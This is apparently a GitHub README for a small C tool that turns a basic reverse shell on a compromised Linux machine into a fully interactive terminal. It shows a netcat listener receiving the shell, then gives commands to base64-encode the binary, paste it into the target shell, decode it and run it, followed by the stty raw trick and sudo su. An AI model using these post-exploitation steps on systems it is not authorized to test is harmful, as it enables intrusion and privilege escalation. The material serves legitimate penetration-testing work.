# simpletty
Just another way to upgrade your dumb tty to fully interactive tty when you compromise a Linux machine

## Explanation

When a pentester compromise the system through a reverse shell they will find that some of the functianilities are not available because they do not have a fully interactive terminal:

```bash
$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [192.168.1.66] from (UNKNOWN) [192.168.1.68] 59976
$ tty
not a tty
$ sudo su   #Not working...
ls
```

Many solutions exists in order to get a tty but normally, you will need python, perl or similar...

If none of these tools are installed on the target, this can be quite annoying.

To solve that I just coded a simple C program that upgrades your dumb tty to a fully interactive tty.

The steps to do so are the following:

- On attacker machine (x64):

```bash
gcc -Os simpletty.c -o simpletty -Wl,--hash-style=both #Compile the source code. When transfering payloads to the target machine, it is always better to optimize size. Size about 17000 bytes.
strip simpletty #Strip binary in order to reduce even more space. Size about 14000 bytes.
gzip simpletty #Compress it to even reduce more space. Size about 2000 bytes :)
base64 simpletty.gz > base64ttygz.txt #If we want to paste something into the non interactive shell, it is better to paste printable ascii text. Size about 4000 bytes :(.
```

Copy to the clipboard the content of the file base64ttygz.txt.

- On the reverse shell of the target machine:

```bash
echo "HERE GOES THE PASTED CONTENT OF base64ttygz.txt(don't forget the double quotes)" > base64ttygz.txt
base64 -d base64ttygz.txt > simpletty.gz
gunzip simpletty.gz
chmod +x simpletty
./simpletty /bin/bash #Or /bin/sh if there is no bash
user@user:~/simpletty$ tty      #We have an interactive tty                                                                                                                                                                                                     
tty                                                                                                                                                                                                                                        
/dev/pts/3                                                                                                                                                                                                                           
#From now on, we can upgrade to a fully interactive shell

Ctrl+Z
[1]+  Stopped                 nc -lnvp 8080                                                                                                                                                                                                
kali@kali:~ $stty -echo raw
fg
Enter
Enter
user@user:~/simpletty$ tty
/dev/pts/3
user@user:~/simpletty$ sudo su                                                                                                                                                                                                       
[sudo] password for user:                                                                                                                                                                                                               
```

The base64 output of base64ttygz.txt is already uploaded so that you will not be annoyed with the previous steps done on the attacker machine. The corresponding compiled binary code is x64 code.

In order to compile 32 bits code (x86), you will need to:
- Either compile in a x86 machine
- Use cross compiling: i686-linux-gnu-gcc -Os simpletty.c -o simpletty -Wl,--hash-style=both


